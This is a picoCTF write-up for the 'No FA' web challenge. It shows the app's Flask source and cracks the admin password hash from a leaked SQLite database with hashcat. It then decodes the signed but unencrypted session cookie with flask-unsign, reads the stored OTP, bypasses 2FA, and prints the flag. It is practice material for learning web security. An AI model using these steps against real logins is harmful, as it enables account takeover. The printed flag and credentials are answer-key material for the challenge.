---
title: "PicoCTF - NO FA"
author: r2cook
categories:
  - PicoCTF
tags:
  - flask 
  - OTP
  - 2fa 
  - session
  - hashcat
  - flask-unsign
  - SQLite
  - authentication-bypass
render_with_liquid: false
media_subpath: /images/picoctf/NO-FA/
image:
  path: room_card.png
---

# No FA

**Platform:** picoCTF  
**Category:** Web Exploitation  
**Difficulty:** Medium

---

## Description

It appears that some sensitive data has been leaked. Your goal is to analyze the application and retrieve the flag.

- Challenge URL: [http://foggy-cliff.picoctf.net:57884/](http://foggy-cliff.picoctf.net:57884/)
    
- Source Code: [https://challenge-files.picoctf.net/c_foggy_cliff/c9b109bb749af208c38950cb236ef9a3cf802f75f5e3d65ff5acc48659d0d79f/app.py](https://challenge-files.picoctf.net/c_foggy_cliff/c9b109bb749af208c38950cb236ef9a3cf802f75f5e3d65ff5acc48659d0d79f/app.py)
    
- Leaked Database: [https://challenge-files.picoctf.net/c_foggy_cliff/c9b109bb749af208c38950cb236ef9a3cf802f75f5e3d65ff5acc48659d0d79f/users.db](https://challenge-files.picoctf.net/c_foggy_cliff/c9b109bb749af208c38950cb236ef9a3cf802f75f5e3d65ff5acc48659d0d79f/users.db)
    

---

## Initial Recon / Enumeration

### 1. Analyzing `app.py`

```python
from flask import Flask, render_template, request, flash, redirect, url_for, session, send_file  
from dotenv import load_dotenv  

import db  
import os  
import hashlib  
import random  
import time  

load_dotenv()  

app = Flask(__name__)  
app.secret_key = os.getenv('SECRET_KEY')  

@app.before_request  
def initialize():  
   app.before_request_funcs[None].remove(initialize)  
   db.init_db()  

@app.route("/")  
def home():  
   if 'username' not in session or session['logged'] == 'false':  
       flash('Please login to access this page', 'red')  
       return redirect(url_for('login'))  
       
   flag = "No flag for you!!"  
   if session.get('username') == 'admin':  
       flag = os.getenv('FLAG')  
       
   return render_template("index.html", flag=flag)  

@app.route('/login', methods=['GET', 'POST'])  
def login():  
   if request.method == 'POST':  
       username = request.form['username']  
       password = request.form['password']  
       user = db.get_user_by_username(username)  
       if user and hashlib.sha256(password.encode()).hexdigest() == user['password']:  
           if user['two_fa']:  
               # Generate OTP  
               otp = str(random.randint(1000, 9999))  
               session['otp_secret'] = otp  
               session['otp_timestamp'] = time.time()  
               session['username'] = username  
               session['logged'] = 'false'  
               # send OTP to mail ---  
               return redirect(url_for('two_fa'))  
           else:  
               session['username'] = username  
               session['logged'] = 'true'  
               flash('Login successful!', 'green')  
               return redirect(url_for('home'))  
       else:  
           flash('Invalid username or password', 'red')  
   return render_template('login.html')  

@app.route('/two_fa', methods=['GET', 'POST'])  
def two_fa():  
   if request.method == 'POST':  
       otp = request.form['otp']  
       stored_otp = session['otp_secret']  
       timestamp = session.get('otp_timestamp')  
       if stored_otp and otp == stored_otp and (time.time() - timestamp) < 120:  
           session['logged'] = 'true'  
           flash('Login successful!', 'green')  
           return redirect(url_for('home'))  
       else:  
           flash('Invalid OTP or OTP expired', 'red')  
           return render_template('2fa.html')  
   else:  
       return render_template('2fa.html')  

@app.route('/logout')  
def logout():  
   flash('You have been logged out.', 'green')  
   session.pop('username', None)  
   session['logged'] = 'false'  
   return redirect(url_for('login'))  
```

### Key Observations:

- Passwords are hashed using SHA-256:
    

```python
if user and hashlib.sha256(password.encode()).hexdigest() == user['password']:
```

- Users are divided into two groups:
    
    - Users with **2FA enabled**
        
    - Users without 2FA
        
- Admin account has `two_fa = 1`, meaning login requires OTP verification.
    
- The OTP is stored inside the session:
    
    - `session['otp_secret']`
        
    - `session['otp_timestamp']`
        

⚠️ This is a critical point and will be exploited later.

---

### 2. Analyzing `users.db`

```shell
$ file users.db  
users.db: SQLite 3.x database, last written using SQLite version 3049001, file counter 2, database pages 4, co  
okie 0x1, schema 4, UTF-8, version-valid-for 2  
```
{: .nolineno }

- The database is SQLite.
    
- After opening it using **DB Browser for SQLite**, we find a `users` table.
    
- The admin user has:
    
    - `username = admin`
        
    - `two_fa = 1`
        
![](8_1.png){: width="800" height="400" .shadow }

---

### 3. Cracking the Admin Password

We extract the admin password hash and crack it using Hashcat:

```shellell
$ hashcat -m 1400 -a 0 hash.txt ~/tools/rockyou.txt  
.....  
c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67:apple@123  
.....  
```
{: .nolineno }

✅ Cracked password:

- **username:** admin
    
- **password:** apple@123
    

---

## Analysis

### What is happening?

- The application implements authentication with optional 2FA.
    
- Admin login requires OTP verification.
    
- The OTP is generated and stored in the session.
    

### What is the vulnerability?

The core issue is:

> 🔥 **Sensitive data (OTP) is stored client-side inside a Flask session cookie**

Flask sessions are:

- Stored on the client
    
- Signed but **not encrypted**
    

This means:

- We can decode the session
    
- Extract the OTP without needing to brute-force it
    

---

## Exploitation / Solution

### Steps:

1. **Login as admin**
    
    - Username: `admin`
        
    - Password: `apple@123`
        
2. **Intercept the session cookie**
    
    - Use browser dev tools or Burp Suite
        
3. **Decode the Flask session**
    

```shell
$ flask-unsign --decode --cookie '.eJwty0sKgCAQANC7zFpCi_xdJoacRPCH2iq6ey7aPngPxOI9ObBwYewEDMqoR6ez0Zgol  
dS_jZCoD0wVrFBqM4avii-7FtLwjcHdqWVMNBO6FDK8H0huHGs.abzxfg.3tDH-fQPbEXP_4rE4Igh20U2flc'  
```
{: .nolineno }

Output:

```python
{'logged': 'false', 'otp_secret': '6768', 'otp_timestamp': 1773990270.5816903, 'username': 'admin'}
```

4. **Extract the OTP**
    
    - `otp_secret = 6768`
        
5. **Submit OTP in `/two_fa`**
    
    - Gain full authenticated access
        
6. **Retrieve the flag**
    

---

## Flag

```css
picoCTF{n0_r4t3_n0_4uth_6db141c5}
```

---

